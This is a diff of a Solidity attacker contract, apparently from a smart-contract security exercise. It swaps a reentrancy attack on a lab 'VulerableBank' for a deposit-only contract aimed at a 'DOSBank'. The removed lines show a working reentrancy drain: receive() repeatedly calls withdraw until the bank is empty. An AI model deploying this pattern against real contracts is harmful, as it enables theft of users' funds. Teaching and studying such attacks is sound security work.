@@ -1,24 +1,19 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.15;
+import "hardhat/console.sol";
 
-import "./VulerableBank.sol";
+import "./DOSBank.sol";
 
-contract HackBank {
-    VulerableBank vulerableBank;
+contract HackDOSBank {
+    DOSBank dosBank;
 
     constructor(address payable _bankAddress) payable {
-        vulerableBank = VulerableBank(_bankAddress);
+        dosBank = DOSBank(_bankAddress);
     }
 
-    function hackContract() external {
-        // fill me in!
-        vulerableBank.deposit{value: address(this).balance}();
-        vulerableBank.withdraw();
+    function deposit() external {
+        dosBank.deposit{value: address(this).balance}();
     }
 
-    receive() external payable {
-        if (address(vulerableBank).balance > 0) {
-            vulerableBank.withdraw();
-        }
-    }
+    receive() external payable {}
 }
